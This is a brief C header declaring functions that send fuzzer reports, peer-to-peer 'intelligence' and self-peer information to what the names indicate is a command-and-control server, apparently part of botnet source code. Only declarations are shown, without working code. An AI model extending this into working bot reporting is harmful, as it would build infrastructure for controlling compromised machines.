#pragma once
#include "includes.h"
#include "fuzzer.h"
#include "p2p_mesh.h"
void cnc_send_fuzzer_report(struct fuzz_result *result);
void cnc_send_p2p_intelligence(void);
void cnc_send_self_peer_info(void);
void cnc_report_worker(void);
